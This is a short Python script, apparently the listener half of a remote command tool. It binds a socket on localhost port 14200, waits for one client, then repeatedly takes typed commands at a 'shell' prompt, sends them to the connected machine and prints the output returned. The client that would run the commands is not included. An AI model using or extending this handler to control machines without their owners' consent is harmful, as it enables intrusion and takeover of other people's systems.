import socket
from colorama import Fore
import time


s=socket.socket(2,1)
s.bind(('localhost',14200))
s.listen(2)

print(Fore.RED+"Server On port 14200 is active")

time.sleep(2)

print(Fore.CYAN+"PLEASE WAITE. . . .")

connection,client=s.accept()
print(Fore.RED+"connected to"+str(client))

while True:
    cmd=input("shell >>>>>: ")
    connection.send(cmd.encode())
    data=connection.recv(123456789)
    print(data.decode())
connection.close()    